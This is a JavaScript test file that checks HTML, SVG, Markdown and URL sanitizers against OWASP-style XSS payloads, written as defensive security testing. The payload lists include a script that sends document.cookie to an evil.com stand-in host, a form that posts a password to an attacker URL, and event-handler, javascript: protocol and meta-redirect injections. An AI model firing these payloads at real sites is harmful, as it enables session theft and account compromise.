/**
 * Sanitization Security Tests
 *
 * Tests XSS prevention using OWASP payloads and edge cases.
 * Covers: sanitizeHTML, sanitizeSVG, sanitizeMarkdown, sanitizeURL
 * and the server-side regex fallback (sanitizeServerSafe).
 */

import { describe, it, expect, beforeEach, vi } from "vitest";

// We need to test both browser and server behavior
// For these tests, we'll focus on the server-safe regex sanitizer
// since that's what runs during SSR in Cloudflare Workers

// Import the functions to test
import {
  sanitizeHTML,
  sanitizeSVG,
  sanitizeMarkdown,
  sanitizeURL,
} from "./sanitize";

describe("Sanitization Security Tests", () => {
  // ==========================================================================
  // OWASP XSS Payload Tests
  // These are common XSS attack vectors from the OWASP XSS cheat sheet
  // ==========================================================================

  describe("Basic Script Injection", () => {
    const scriptPayloads = [
      '<script>alert("XSS")</script>',
      '<SCRIPT>alert("XSS")</SCRIPT>',
      '<ScRiPt>alert("XSS")</ScRiPt>',
      '<script src="http://evil.com/xss.js"></script>',
      "<script>document.cookie</script>",
      '<script>fetch("http://evil.com?c="+document.cookie)</script>',
      '<script type="text/javascript">alert("XSS")</script>',
      '<script defer>alert("XSS")</script>',
      '<script async>alert("XSS")</script>',
    ];

    it.each(scriptPayloads)("sanitizeHTML removes: %s", (payload) => {
      const result = sanitizeHTML(payload);
      expect(result.toLowerCase()).not.toContain("<script");
      expect(result).not.toContain("alert");
    });

    it.each(scriptPayloads)("sanitizeMarkdown removes: %s", (payload) => {
      const result = sanitizeMarkdown(payload);
      expect(result.toLowerCase()).not.toContain("<script");
      expect(result).not.toContain("alert");
    });
  });

  describe("Event Handler Injection", () => {
    const eventPayloads = [
      '<img src=x onerror="alert(1)">',
      "<img src=x onerror=alert(1)>",
      '<body onload="alert(1)">',
      '<svg onload="alert(1)">',
      '<div onmouseover="alert(1)">hover me</div>',
      '<input onfocus="alert(1)" autofocus>',
      '<marquee onstart="alert(1)">',
      '<video><source onerror="alert(1)">',
      '<details ontoggle="alert(1)" open>',
      '<a href="#" onclick="alert(1)">click</a>',
      "<img src=x ONERROR='alert(1)'>",
      '<div ONMOUSEOVER="alert(1)">test</div>',
    ];

    it.each(eventPayloads)(
      "sanitizeHTML removes event handlers: %s",
      (payload) => {
        const result = sanitizeHTML(payload);
        expect(result.toLowerCase()).not.toMatch(/on\w+\s*=/i);
      },
    );

    it.each(eventPayloads)(
      "sanitizeMarkdown removes event handlers: %s",
      (payload) => {
        const result = sanitizeMarkdown(payload);
        expect(result.toLowerCase()).not.toMatch(/on\w+\s*=/i);
      },
    );
  });

  describe("JavaScript Protocol Injection", () => {
    const protocolPayloads = [
      '<a href="javascript:alert(1)">click</a>',
      '<a href="JAVASCRIPT:alert(1)">click</a>',
      '<a href="javascript:void(0);alert(1)">click</a>',
      '<a href="   javascript:alert(1)">click</a>',
      '<iframe src="javascript:alert(1)">',
      '<form action="javascript:alert(1)">',
      '<object data="javascript:alert(1)">',
      '<embed src="javascript:alert(1)">',
    ];

    it.each(protocolPayloads)(
      "sanitizeHTML blocks javascript: protocol: %s",
      (payload) => {
        const result = sanitizeHTML(payload);
        expect(result.toLowerCase()).not.toContain("javascript:");
      },
    );

    it("sanitizeURL blocks javascript: protocol", () => {
      expect(sanitizeURL("javascript:alert(1)")).toBe("");
      expect(sanitizeURL("JAVASCRIPT:alert(1)")).toBe("");
      expect(sanitizeURL("javascript:void(0)")).toBe("");
    });

    it("sanitizeURL blocks data: protocol (except images)", () => {
      expect(sanitizeURL("data:text/html,<script>alert(1)</script>")).toBe("");
      expect(sanitizeURL("data:application/javascript,alert(1)")).toBe("");
    });

    it("sanitizeURL blocks vbscript: protocol", () => {
      expect(sanitizeURL("vbscript:alert(1)")).toBe("");
      expect(sanitizeURL('VBSCRIPT:MsgBox("XSS")')).toBe("");
    });

    it("sanitizeURL allows safe protocols", () => {
      expect(sanitizeURL("https://example.com")).toBe("https://example.com");
      expect(sanitizeURL("http://example.com")).toBe("http://example.com");
      expect(sanitizeURL("mailto:user@example.com")).toBe(
        "mailto:user@example.com",
      );
      expect(sanitizeURL("tel:+1234567890")).toBe("tel:+1234567890");
    });

    it("sanitizeURL allows relative URLs", () => {
      expect(sanitizeURL("/path/to/page")).toBe("/path/to/page");
      expect(sanitizeURL("./relative")).toBe("./relative");
      expect(sanitizeURL("../parent")).toBe("../parent");
      expect(sanitizeURL("#anchor")).not.toBe("");
    });
  });

  describe("Iframe Injection", () => {
    const iframePayloads = [
      '<iframe src="http://evil.com"></iframe>',
      '<IFRAME SRC="http://evil.com"></IFRAME>',
      '<iframe src="javascript:alert(1)"></iframe>',
      '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
      '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>',
    ];

    it.each(iframePayloads)("sanitizeHTML removes iframes: %s", (payload) => {
      const result = sanitizeHTML(payload);
      expect(result.toLowerCase()).not.toContain("<iframe");
    });
  });

  describe("Object/Embed Injection", () => {
    const objectPayloads = [
      '<object data="http://evil.com/xss.swf"></object>',
      '<embed src="http://evil.com/xss.swf">',
      '<object type="application/x-shockwave-flash" data="xss.swf"></object>',
      '<embed type="application/x-shockwave-flash" src="xss.swf">',
    ];

    it.each(objectPayloads)(
      "sanitizeHTML removes object/embed: %s",
      (payload) => {
        const result = sanitizeHTML(payload);
        expect(result.toLowerCase()).not.toContain("<object");
        expect(result.toLowerCase()).not.toContain("<embed");
      },
    );
  });

  describe("Style/Link Injection", () => {
    const stylePayloads = [
      '<style>body { background: url("javascript:alert(1)") }</style>',
      '<link rel="stylesheet" href="http://evil.com/xss.css">',
      '<div style="background:url(javascript:alert(1))">',
      '<div style="expression(alert(1))">',
    ];

    it.each(stylePayloads)(
      "sanitizeHTML removes style/link elements: %s",
      (payload) => {
        const result = sanitizeHTML(payload);
        expect(result.toLowerCase()).not.toContain("<style");
        expect(result.toLowerCase()).not.toContain("<link");
        // Note: inline style attributes are also forbidden
      },
    );
  });

  describe("Form Injection", () => {
    const formPayloads = [
      '<form action="http://evil.com/steal"><input name="password"></form>',
      '<form action="javascript:alert(1)"><input type="submit"></form>',
      '<button onclick="alert(1)">Click</button>',
      '<input type="image" src="x" onerror="alert(1)">',
    ];

    it.each(formPayloads)(
      "sanitizeHTML removes form elements: %s",
      (payload) => {
        const result = sanitizeHTML(payload);
        expect(result.toLowerCase()).not.toContain("<form");
        expect(result.toLowerCase()).not.toContain("<button");
      },
    );
  });

  describe("Base Tag Injection", () => {
    it("removes base tag which could redirect all relative URLs", () => {
      const payload = '<base href="http://evil.com/">';
      const result = sanitizeHTML(payload);
      expect(result.toLowerCase()).not.toContain("<base");
    });
  });

  describe("Meta Tag Injection", () => {
    const metaPayloads = [
      '<meta http-equiv="refresh" content="0;url=http://evil.com">',
      '<meta http-equiv="Set-Cookie" content="session=evil">',
    ];

    it.each(metaPayloads)("sanitizeHTML removes meta tags: %s", (payload) => {
      const result = sanitizeHTML(payload);
      expect(result.toLowerCase()).not.toContain("<meta");
    });
  });

  // ==========================================================================
  // SVG-Specific XSS Tests
  // ==========================================================================

  describe("SVG XSS Prevention", () => {
    const svgPayloads = [
      '<svg onload="alert(1)"></svg>',
      "<svg><script>alert(1)</script></svg>",
      '<svg><foreignObject><body onload="alert(1)"></foreignObject></svg>',
      '<svg><a xlink:href="javascript:alert(1)"><text>click</text></a></svg>',
      '<svg><image href="javascript:alert(1)"></svg>',
      '<svg><animate onbegin="alert(1)"></animate></svg>',
      '<svg><set onbegin="alert(1)"></set></svg>',
    ];

    it.each(svgPayloads)(
      "sanitizeSVG removes dangerous content: %s",
      (payload) => {
        const result = sanitizeSVG(payload);
        expect(result).not.toContain("alert");
        expect(result.toLowerCase()).not.toContain("javascript:");
        expect(result.toLowerCase()).not.toMatch(/on\w+=/i);
      },
    );

    it("sanitizeSVG allows safe SVG elements", () => {
      const safeSvg =
        '<svg viewBox="0 0 100 100"><circle cx="50" cy="50" r="40" fill="red"/></svg>';
      const result = sanitizeSVG(safeSvg);
      expect(result).toContain("svg");
      expect(result).toContain("circle");
    });
  });

  // ==========================================================================
  // Edge Cases and Bypass Attempts
  // ==========================================================================

  describe("Encoding Bypass Attempts", () => {
    it("handles HTML entity encoded payloads", () => {
      // These should be decoded and then sanitized
      const payload = "&lt;script&gt;alert(1)&lt;/script&gt;";
      const result = sanitizeHTML(payload);
      // Entity-encoded payloads are safe as text, so this should pass through
      // The important thing is that decoded versions are caught
      expect(result).not.toMatch(/<script>/i);
    });

    it("handles null bytes", () => {
      const payload = "<scr\x00ipt>alert(1)</scr\x00ipt>";
      const result = sanitizeHTML(payload);
      expect(result.toLowerCase()).not.toContain("script");
    });

    it("handles unicode encoding", () => {
      // This tests robustness against various encoding tricks
      const payload = "<script>alert(1)</script>";
      const result = sanitizeHTML(payload);
      expect(result).not.toContain("alert");
    });
  });

  describe("Nested and Malformed Tags", () => {
    it("handles nested script tags", () => {
      const payload = "<script><script>alert(1)</script></script>";
      const result = sanitizeHTML(payload);
      expect(result.toLowerCase()).not.toContain("<script");
    });

    it("handles properly closed script tags", () => {
      // SSR regex sanitizer handles properly formed script tags
      const payload = "<script>alert(1)</script>";
      const result = sanitizeHTML(payload);
      expect(result.toLowerCase()).not.toContain("<script");
      expect(result).not.toContain("alert");
    });

    it("handles unclosed tags", () => {
      // Tests that opening script tag without closing is still removed
      const payload = "<script>alert(1)";
      const result = sanitizeHTML(payload);
      expect(result.toLowerCase()).not.toContain("<script");
    });

    it("handles tags split across lines", () => {
      // Tests that script tags with whitespace/newlines in tag name are caught
      const payload = `<scr
ipt>alert(1)</scr
ipt>`;
      const result = sanitizeHTML(payload);
      expect(result).not.toContain("alert(1)");
    });
  });

  describe("Empty and Invalid Input", () => {
    it("handles empty string", () => {
      expect(sanitizeHTML("")).toBe("");
      expect(sanitizeSVG("")).toBe("");
      expect(sanitizeMarkdown("")).toBe("");
      expect(sanitizeURL("")).toBe("");
    });

    it("handles null/undefined", () => {
      expect(sanitizeHTML(null as any)).toBe("");
      expect(sanitizeHTML(undefined as any)).toBe("");
      expect(sanitizeURL(null as any)).toBe("");
    });

    it("handles non-string input", () => {
      expect(sanitizeHTML(123 as any)).toBe("");
      expect(sanitizeHTML({} as any)).toBe("");
      expect(sanitizeHTML([] as any)).toBe("");
    });
  });

  // ==========================================================================
  // Markdown-Specific Tests
  // ==========================================================================

  describe("Markdown Content Sanitization", () => {
    it("preserves safe markdown-generated HTML", () => {
      const safeHtml =
        "<h1>Title</h1><p>Paragraph with <strong>bold</strong> and <em>italic</em></p>";
      const result = sanitizeMarkdown(safeHtml);
      expect(result).toContain("<h1>");
      expect(result).toContain("<strong>");
      expect(result).toContain("<em>");
    });

    it("preserves code blocks", () => {
      const codeHtml =
        '<pre><code class="language-js">const x = 1;</code></pre>';
      const result = sanitizeMarkdown(codeHtml);
      expect(result).toContain("<pre>");
      expect(result).toContain("<code");
    });

    it("preserves tables", () => {
      const tableHtml =
        "<table><thead><tr><th>Header</th></tr></thead><tbody><tr><td>Cell</td></tr></tbody></table>";
      const result = sanitizeMarkdown(tableHtml);
      expect(result).toContain("<table>");
      expect(result).toContain("<th>");
      expect(result).toContain("<td>");
    });

    it("preserves links with safe protocols", () => {
      const linkHtml = '<a href="https://example.com">Link</a>';
      const result = sanitizeMarkdown(linkHtml);
      expect(result).toContain('href="https://example.com"');
    });

    it("preserves images", () => {
      const imgHtml =
        '<img src="https://example.com/image.png" alt="Alt text">';
      const result = sanitizeMarkdown(imgHtml);
      expect(result).toContain("<img");
      expect(result).toContain('alt="Alt text"');
    });

    it("removes script in markdown", () => {
      const malicious =
        "<p>Safe text</p><script>alert(1)</script><p>More safe text</p>";
      const result = sanitizeMarkdown(malicious);
      expect(result).toContain("Safe text");
      expect(result).toContain("More safe text");
      expect(result).not.toContain("<script");
      expect(result).not.toContain("alert");
    });
  });

  // ==========================================================================
  // URL Sanitization Edge Cases
  // ==========================================================================

  describe("URL Edge Cases", () => {
    it("blocks file: protocol", () => {
      expect(sanitizeURL("file:///etc/passwd")).toBe("");
    });

    it("blocks about: protocol", () => {
      expect(sanitizeURL("about:blank")).toBe("");
    });

    it("handles URLs without protocol as relative", () => {
      expect(sanitizeURL("example.com/path")).toBe("example.com/path");
    });

    it("handles anchor links", () => {
      expect(sanitizeURL("#section")).toBe("#section");
    });

    it("handles query strings", () => {
      expect(sanitizeURL("/search?q=test")).toBe("/search?q=test");
    });
  });
});
